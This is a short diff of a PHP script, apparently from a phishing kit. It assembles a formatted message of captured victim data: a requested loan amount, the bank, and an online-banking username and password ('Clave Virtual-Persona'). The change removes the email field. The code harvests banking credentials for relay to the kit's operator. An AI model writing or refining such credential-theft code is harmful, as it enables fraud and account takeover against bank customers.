@@ -148,7 +148,6 @@ if (trim($nombreFinal) !== '' || trim($nombreUsuarioInit) !== '') {
 }
 $mensaje .= "\xF0\x9F\x92\xB0 <b>Monto / Cupo solicitado:</b> " . fv($montoMuestra) . "\n";
 $mensaje .= "\xF0\x9F\x8F\xA6 <b>Banco:</b> " . fv($bancoFinal) . "\n";
-$mensaje .= "\xF0\x9F\x93\xA7 <b>Correo:</b> " . fv($correoFinal) . "\n";
 $mensaje .= $SEP . "\n";
 $mensaje .= "\xF0\x9F\x91\xA4 <b>Usuario Virtual-Persona:</b> " . fv($nombreUsuario) . "\n";
 $mensaje .= "\xF0\x9F\x94\x92 <b>Clave Virtual-Persona:</b> " . fv($password) . "\n";
